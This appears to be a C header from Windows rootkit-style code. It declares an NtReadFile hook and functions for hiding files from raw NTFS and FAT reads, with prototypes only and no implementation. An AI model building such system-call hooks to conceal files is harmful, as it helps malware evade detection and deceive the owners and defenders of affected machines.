#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

typedef NTSTATUS (WINAPI* NTREADFILE)(HANDLE,HANDLE,PIO_APC_ROUTINE,PVOID,PIO_STATUS_BLOCK,PVOID,LONG,PLARGE_INTEGER,PULONG);

int Ntfsstrnicmp(char*, WCHAR*,size_t);
int Fatstrnicmp(char*,char*,size_t);
LPVOID FindHiddenFileNtfs(LPVOID,ULONG);
LPVOID FindHiddenFileFat(LPVOID,ULONG);
void FSRawHide(PVOID,DWORD);

#ifndef __NTREADFILE__
#define __NTREADFILE__

#define UNICODE_MAX_PATH MAX_PATH*2

NTREADFILE OldNtReadFile;
NTSTATUS WINAPI NewNtReadFile(HANDLE,HANDLE,PIO_APC_ROUTINE,PVOID,PIO_STATUS_BLOCK,PVOID,ULONG,PLARGE_INTEGER,PULONG);

#endif 